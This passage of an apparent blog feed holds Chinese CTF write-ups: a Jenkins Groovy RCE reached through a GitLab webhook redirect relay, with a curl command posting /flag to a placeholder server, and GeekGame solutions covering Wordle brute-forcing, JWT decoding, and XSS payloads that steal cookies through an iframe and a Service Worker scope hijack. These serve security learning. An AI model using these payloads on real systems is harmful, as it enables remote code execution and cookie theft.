请求方式更改</h2><p>由于 <code>Github</code> 和 <code>Gitlab</code> 发送的 Webhooks 请求均为 <code>POST</code> 请求<br>而如果尝试直接将 Webhooks 以 POST请求 的方式发送至靶机<br>会得到 <code>Method Not Allowed</code> 的提示</p><p>因此需要利用公网 <code>server</code> 来中转请求<br>将 <code>POST</code> 请求更改为 <code>GET</code> 请求来让靶机上的 flask server 接收</p><h2 id="2-Webhooks-平台选择"><a href="#2-Webhooks-平台选择" class="headerlink" title="2. Webhooks 平台选择"></a>2. Webhooks 平台选择</h2><p>由于题目中写的是 Abuse Gitxxb Webhooks，并未指明是使用 <code>Github</code> 还是 <code>Gitlab</code><br>但其中只有 <code>Gitlab</code> 的 Webhooks 支持 302 Redirect 请求跟踪<br>由于需要使用公网 <code>server</code> 的 302 Redirect 来中转请求<br>因此我们考虑使用 <code>Gitlab</code> 的 Webhooks</p><h2 id="3-中转服务器配置"><a href="#3-中转服务器配置" class="headerlink" title="3. 中转服务器配置"></a>3. 中转服务器配置</h2><p>在中转服务器（需要公网ip）中配置 flask server 来更改请求方式<br>具体实现代码如下：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> redirectapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/redirect'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">redi</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'http://&lt;attack_server>:&lt;port>/?redirect_url=http%3A%2F%2Fjenkins%3A8080%2FsecurityRealm%2Fuser%2Fadmin%2FdescriptorByName%2Forg.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript%2FcheckScript%3Fsandbox%3Dtrue%26value%3Dpublic%20class%20x%20%7Bpublic%20x()%7B%22curl%20-X%20POST%20-d%20%40%2Fflag%20http%3A%2F%2F&lt;own_server>:&lt;listen_port>%22.execute()%7D%7D'</span><span class="token punctuation">,</span>code<span class="token operator">=</span><span class="token number">302</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token operator">&lt;</span>webhooks_port<span class="token operator">></span><span class="token punctuation">)</span></code></pre><h2 id="4-Gitlab-Webhooks-配置"><a href="#4-Gitlab-Webhooks-配置" class="headerlink" title="4. Gitlab Webhooks 配置"></a>4. Gitlab Webhooks 配置</h2><p>配置 Gitlab Webhooks 链接如下</p><pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;&lt;own_server&gt;:&lt;webhooks_port&gt;&#x2F;redirect</code></pre><p>进行一次 Webhook 测试，即可获得 flag</p><pre class="language-bash" data-language="bash"><code class="language-bash">POST / HTTP/1.1Host: <span class="token operator">&lt;</span>own_server<span class="token operator">></span>:<span class="token operator">&lt;</span>listen_port<span class="token operator">></span>User-Agent: curl/7.52.1Accept: */*Content-Length: <span class="token number">38</span>Content-Type: application/x-www-form-urlencodedflag<span class="token punctuation">&#123;</span>85f240c4983a496fac9d5b44daa3149a<span class="token punctuation">&#125;</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Write Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NodeJS </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023 GeekGame WriteUp</title>
      <link href="/write-up/2023-geekgame-writeup/"/>
      <url>/write-up/2023-geekgame-writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="Emoji-Wordle"><a href="#Emoji-Wordle" class="headerlink" title="Emoji Wordle"></a>Emoji Wordle</h1><p>才发现原来 emoji 可以被放在代码里和 GET 传参里 ~</p><h2 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h2><p><img src="image-1.png" alt="image-1.png"></p><h3 id="1-1-爆破法"><a href="#1-1-爆破法" class="headerlink" title="1.1 爆破法"></a>1.1 爆破法</h3><p>根据提示，Level1的答案不变，<br>采用无脑爆破法枚举每个位置上的 emojis</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re<span class="token keyword">import</span> requestsYES <span class="token operator">=</span> <span class="token string">'🟩'</span>NO <span class="token operator">=</span> <span class="token string">'🟥'</span>MAYBE <span class="token operator">=</span> <span class="token string">'🟨'</span>URL <span class="token operator">=</span> <span class="token string">'https://prob14.geekgame.pku.edu.cn/level1'</span>r1 <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'placeholder="(.*)"'</span><span class="token punctuation">)</span>r2 <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'results.push\("(.*)"\)'</span><span class="token punctuation">)</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>emoji <span class="token operator">=</span> <span class="token string">"A"</span>location <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        guess <span class="token operator">=</span> r<span class="token punctuation">.</span>get<span class="token punctuation">(</span>URL<span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">&#123;</span>            <span class="token string">'guess'</span><span class="token punctuation">:</span> emoji          <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text        result <span class="token operator">=</span> r2<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>guess<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>emoji<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>        <span class="token keyword">for</span> idx <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> result<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">==</span> YES<span class="token punctuation">:</span>                location<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> emoji<span class="token punctuation">[</span>idx<span class="token punctuation">]</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>            new_emoji <span class="token operator">=</span> r1<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>guess<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>        e <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> idx <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>new_emoji<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> location<span class="token punctuation">.</span>get<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>                e<span class="token punctuation">.</span>append<span class="token punctuation">(</span>location<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                e<span class="token punctuation">.</span>append<span class="token punctuation">(</span>new_emoji<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">)</span>            emoji <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>e<span class="token punctuation">)</span></code></pre><p>运行代码直到全部变绿</p><pre class="language-none"><code class="language-none">💈💅👼💁👦👗💊💊👱👇👔💆👺👦👓👳👔👉👞💄👧👘💃👺👸👴👿👙👵💆👩👽👛👓👦👝👢💃💅👶👅💈👈💅👼👁👃💂👆👄👂👳👲👢💆👤👜👆👺👱👺👛👆👡🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩</code></pre><h3 id="1-2-逻辑法"><a href="#1-2-逻辑法" class="headerlink" title="1.2 逻辑法"></a>1.2 逻辑法</h3><p>我们已知总共有 128 个 emojis<br>如果我们已知题目中包含的 64 种 emojis<br>就能通过每次填充 64 个相同的 emoji 来得知哪些位置是该 emoji<br>因此只需要 63 次就能猜出答案</p><p>至于如何确定题目使用的是哪64种emojis<br>可以通过在大量多次生成 placeholder 来确定</p><h3 id="1-3-提交-emojis"><a href="#1-3-提交-emojis" class="headerlink" title="1.3 提交 emojis"></a>1.3 提交 emojis</h3><p>提交 emojis 获得 flag</p><pre class="language-none"><code class="language-none">Your flag: flag&#123;s1Mp1e_brut3f0rc3&#125;</code></pre><h2 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h2><p>根据 Hint 查看 Cookie</p><pre class="language-none"><code class="language-none">eyJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7ImxldmVsIjoiMiIsInJlbWFpbmluZ19ndWVzc2VzIjoiOCIsInRhcmdldCI6Ilx1RDgzRFx1REM0N1x1RDgzRFx1REM3Q1x1RDgzRFx1REM1Nlx1RDgzRFx1REM3NVx1RDgzRFx1REM3RFx1RDgzRFx1REM0NFx1RDgzRFx1REM4Mlx1RDgzRFx1REM0MVx1RDgzRFx1REM1Mlx1RDgzRFx1REM2NVx1RDgzRFx1REM1RFx1RDgzRFx1REM4QVx1RDgzRFx1REM2Mlx1RDgzRFx1REM1RVx1RDgzRFx1REM0MFx1RDgzRFx1REM0NVx1RDgzRFx1REM2OFx1RDgzRFx1REM4M1x1RDgzRFx1REM4Mlx1RDgzRFx1REM3QVx1RDgzRFx1REM4MFx1RDgzRFx1REM2NVx1RDgzRFx1REM3QVx1RDgzRFx1REM3Q1x1RDgzRFx1REM3Q1x1RDgzRFx1REM4Nlx1RDgzRFx1REM0Nlx1RDgzRFx1REM3M1x1RDgzRFx1REM4N1x1RDgzRFx1REM3OFx1RDgzRFx1REM4MVx1RDgzRFx1REM1OFx1RDgzRFx1REM2M1x1RDgzRFx1REM0NVx1RDgzRFx1REM3N1x1RDgzRFx1REM0MVx1RDgzRFx1REM0M1x1RDgzRFx1REM1QVx1RDgzRFx1REM1MVx1RDgzRFx1REMzQlx1RDgzRFx1REM0Nlx1RDgzRFx1REM2QVx1RDgzRFx1REM4M1x1RDgzRFx1REM1NFx1RDgzRFx1REM3NVx1RDgzRFx1REM4N1x1RDgzRFx1REM4OVx1RDgzRFx1REM3Mlx1RDgzRFx1REM3Q1x1RDgzRFx1REM3Qlx1RDgzRFx1REM0NVx1RDgzRFx1REM1NFx1RDgzRFx1REM1OVx1RDgzRFx1REM2Nlx1RDgzRFx1REM2QVx1RDgzRFx1REM1Qlx1RDgzRFx1REM4OFx1RDgzRFx1REM4NVx1RDgzRFx1REM4OFx1RDgzRFx1REM2OVx1RDgzRFx1REM1NFx1RDgzRFx1REM2NVx1RDgzRFx1REM3NFx1RDgzRFx1REM1NyJ9LCJuYmYiOjE3MDEzNTAxODYsImlhdCI6MTcwMTM1MDE4Nn0.eC3acijxIGEM1alsrrBpd_SgxcYbxXc2HCbmYNKNmJg</code></pre><p>在 <a href="jwt.io">jwt.io</a> 解密后获得</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"data"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"level"</span><span class="token operator">:</span> <span class="token string">"2"</span><span class="token punctuation">,</span>    <span class="token property">"remaining_guesses"</span><span class="token operator">:</span> <span class="token string">"8"</span><span class="token punctuation">,</span>    <span class="token property">"target"</span><span class="token operator">:</span> <span class="token string">"👇👼👖👵👽👄💂👁👒👥👝💊👢👞👀👅👨💃💂👺💀👥👺👼👼💆👆👳💇👸💁👘👣👅👷👁👃👚👑🐻👆👪💃👔👵💇💉👲👼👻👅👔👙👦👪👛💈💅💈👩👔👥👴👗"</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token property">"nbf"</span><span class="token operator">:</span> <span class="token number">1701350186</span><span class="token punctuation">,</span>  <span class="token property">"iat"</span><span class="token operator">:</span> <span class="token number">1701350186</span><span class="token punctuation">&#125;</span></code></pre><p>输入</p><pre class="language-none"><code class="language-none">👇👼👖👵👽👄💂👁👒👥👝💊👢👞👀👅👨💃💂👺💀👥👺👼👼💆👆👳💇👸💁👘👣👅👷👁👃👚👑🐻👆👪💃👔👵💇💉👲👼👻👅👔👙👦👪👛💈💅💈👩👔👥👴👗</code></pre><p>获得 flag</p><pre class="language-none"><code class="language-none">Your flag: flag&#123;d3c0d1n9_jwT_15_345y&#125;</code></pre><h2 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h2><p>这次的 Cookie 中没有直接给出答案<br>由于服务器不存储状态</p><blockquote><p>这点可以从 Hint 或者 Cookie 名称 PLAY_SESSION 中<br>得知服务端使用的是 Play Framework</p></blockquote><p>我们通过多次携带相同的 Cookie 进行爆破<br>ps: 好像本题的 Cookie 会超时，要在短时间内进行爆破（）</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re<span class="token keyword">import</span> random<span class="token keyword">import</span> requestsYES <span class="token operator">=</span> <span class="token string">'🟩'</span>NO <span class="token operator">=</span> <span class="token string">'🟥'</span>MAYBE <span class="token operator">=</span> <span class="token string">'🟨'</span>URL <span class="token operator">=</span> <span class="token string">'https://prob14.geekgame.pku.edu.cn/level3'</span>r1 <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'placeholder="(.*)"'</span><span class="token punctuation">)</span>r2 <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'results.push\("(.*)"\)'</span><span class="token punctuation">)</span>emoji <span class="token operator">=</span> <span class="token string">"A"</span>location <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>bad_location <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>JWT <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>URL<span class="token punctuation">)</span><span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'PLAY_SESSION'</span><span class="token punctuation">)</span>good <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>bad <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>idx<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        e <span class="token operator">=</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>good<span class="token punctuation">)</span>        <span class="token keyword">if</span> idx <span class="token keyword">not</span> <span class="token keyword">in</span> bad_location<span class="token punctuation">.</span>get<span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> e<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    guess <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>URL<span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">&#123;</span>        <span class="token string">'guess'</span><span class="token punctuation">:</span> emoji    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span>        <span class="token string">'PLAY_SESSION'</span><span class="token punctuation">:</span> JWT    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text    <span class="token keyword">print</span><span class="token punctuation">(</span>guess<span class="token punctuation">)</span>    result <span class="token operator">=</span> r2<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>guess<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>emoji<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>    <span class="token keyword">for</span> idx <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> result<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">==</span> YES<span class="token punctuation">:</span>            location<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> emoji<span class="token punctuation">[</span>idx<span class="token punctuation">]</span>        <span class="token keyword">if</span> result<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">==</span> NO<span class="token punctuation">:</span>            bad<span class="token punctuation">.</span>append<span class="token punctuation">(</span>emoji<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> result<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">==</span> MAYBE<span class="token punctuation">:</span>            good<span class="token punctuation">.</span>append<span class="token punctuation">(</span>emoji<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">)</span>            bl <span class="token operator">=</span> bad_location<span class="token punctuation">.</span>get<span class="token punctuation">(</span>emoji<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            bl<span class="token punctuation">.</span>append<span class="token punctuation">(</span>idx<span class="token punctuation">)</span>            bad_location<span class="token punctuation">[</span>emoji<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> bl      new_emoji <span class="token operator">=</span> r1<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>guess<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    e <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> idx <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>new_emoji<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> location<span class="token punctuation">.</span>get<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>            e<span class="token punctuation">.</span>append<span class="token punctuation">(</span>location<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> new_emoji<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token keyword">in</span> bad<span class="token punctuation">:</span>                e<span class="token punctuation">.</span>append<span class="token punctuation">(</span>get<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                e<span class="token punctuation">.</span>append<span class="token punctuation">(</span>new_emoji<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">)</span>      emoji <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>e<span class="token punctuation">)</span></code></pre><p>获得 flag</p><pre class="language-none"><code class="language-none">Your flag: flag&#123;StateIess_game_IS_a_b4d_1d3a&#125;</code></pre><h1 id="第三新XSS"><a href="#第三新XSS" class="headerlink" title="第三新XSS"></a>第三新XSS</h1><h2 id="Flag-1"><a href="#Flag-1" class="headerlink" title="Flag 1"></a>Flag 1</h2><p>由于页面中的 flag 的 Cookie 设置了 <code>path=/admin</code><br>所以不能直接在页面中读取 包含 flag 的 Cookie</p><h3 id="1-1-iframe-读取信息"><a href="#1-1-iframe-读取信息" class="headerlink" title="1.1 iframe 读取信息"></a>1.1 iframe 读取信息</h3><p>根据 Hint 可知<br>由于在同源环境下<br>可通过 iframe 读取 Cookie 并输出</p><p>因此有 Payload ：</p><pre class="language-none"><code class="language-none">&lt;iframe src&#x3D;&quot;&#x2F;admin&#x2F;&quot;&gt;&lt;&#x2F;iframe&gt;&lt;script&gt;document.title &#x3D; &#39;running&#39;;setTimeout(()&#x3D;&gt;&#123;    document.title &#x3D; &#39;got: &#39; + document.querySelector(&#39;iframe&#39;).contentDocument.cookie;&#125;, 500);&lt;&#x2F;script&gt;</code></pre><p>即可在 xss bot 处获得 flag 1：</p><p><img src="image-2.png" alt="image-2.png"></p><h2 id="Flag-2"><a href="#Flag-2" class="headerlink" title="Flag 2"></a>Flag 2</h2><pre class="language-python" data-language="python"><code class="language-python">driver<span class="token punctuation">.</span>get<span class="token punctuation">(</span>admin_url<span class="token punctuation">)</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">.5</span><span class="token punctuation">)</span>driver<span class="token punctuation">.</span>execute_script<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'document.cookie = "flag=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>getflag<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">; path=/admin"'</span></span><span class="token punctuation">)</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></code></pre><p>由这段代码我们发现<br>xss bot 先访问了网页<br>然后关掉浏览器并重新打开了 &#x2F;admin</p><h3 id="2-1-Service-Worker-工作范围提升"><a href="#2-1-Service-Worker-工作范围提升" class="headerlink" title="2.1 Service Worker 工作范围提升"></a>2.1 Service Worker 工作范围提升</h3><p>由 Hint <code>Service Worker</code> 可以缓存之前打开过的网页</p><blockquote><p>Service Workder：Progressive Web App 的一部分<br>意义在于让网页可以提供与原生 App 类似的体验，在离线时仍然可以工作</p></blockquote><p>因此我们可以利用 <code>Service Worker</code> 劫持 &#x2F;admin 目录</p><p>但是浏览器默认限制 Service Worker 的工作范围仅限于它所在的这个目录</p><blockquote><p>假设 Service Worker 的脚本是 &#x2F;path_to&#x2F;sw.js<br>那么它只能看到并修改 &#x2F;path_to&#x2F; 底下的所有 HTTP 请求<br>因此 &#x2F;admin&#x2F; 还是安全的</p></blockquote><p>我们可以利用设置响应头 <code>Service-Worker-Allowed: /</code><br>手动提升它的默认工作范围到 <code>/</code> 来绕过限制</p><h3 id="2-2-注册-Service-Worker-缓存页面"><a href="#2-2-注册-Service-Worker-缓存页面" class="headerlink" title="2.2 注册 Service Worker 缓存页面"></a>2.2 注册 Service Worker 缓存页面</h3><h4 id="2-2-1-flag2-a"><a href="#2-2-1-flag2-a" class="headerlink" title="2.2.1 flag2_a"></a>2.2.1 flag2_a</h4><pre class="language-none"><code class="language-none">&#39;Content-Type&#39;: &#39;text&#x2F;html&#39;,</code></pre><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">await</span> navigator<span class="token punctuation">.</span>serviceWorker<span class="token punctuation">.</span><span class="token function">register</span><span class="token punctuation">(</span><span class="token string">'/flag2_b/sw.js'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>        <span class="token literal-property property">scope</span><span class="token operator">:</span> <span class="token string">'/'</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    document<span class="token punctuation">.</span>title <span class="token operator">=</span> <span class="token string">'done'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span>title <span class="token operator">=</span> <span class="token string">'running'</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><h4 id="2-2-2-flag2-b"><a href="#2-2-2-flag2-b" class="headerlink" title="2.2.2 flag2_b"></a>2.2.2 flag2_b</h4><pre class="language-none"><code class="language-none">&#39;Content-Type&#39;: &#39;text&#x2F;javascript&#39;,&#39;Service-Worker-Allowed&#39;: &#39;&#x2F;&#39;,</code></pre><pre class="language-javascript" data-language="javascript"><code class="language-javascript">self<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'fetch'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'fetch'</span><span class="token punctuation">,</span> event<span class="token punctuation">.</span>request<span class="token punctuation">.</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>request<span class="token punctuation">.</span>url<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'/admin/'</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        event<span class="token punctuation">.</span><span class="token function">respondWith</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Response</span><span class="token punctuation">(</span><span class="token string">'&lt;script>setInterval(()=>&#123;document.title=document.cookie&#125;, 100)&lt;/script>'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>            <span class="token literal-property property">headers</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token string-property property">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'text/html'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h4 id="2-2-3-获得-flag"><a href="#2-2-3-获得-flag" class="headerlink" title="2.2.3 获得 flag"></a>2.2.3 获得 flag</h4><p>此时如果 xss bot 访问 <code>/flag2_a/</code><br>就会注册上 <code>/flag2_b/sw.js</code> 的 <code>Service Worker</code><br>&#x2F;admin&#x2F; 就会被劫持到缓存中:<br>即可在 xss bot 处获得 flag 2：<br><img src="image-3.png" alt="image-3.png"></p>]]></content>
      
      
      <categories>
          
          <category> Write Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NodeJS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023 SpiritCTF Warmup WriteUp</title>
      <link href="/write-up/2023-spiritctf-warmup-writeup/"/>
      <url>/write-up/2023-spiritctf-warmup-writeup/</url>
      
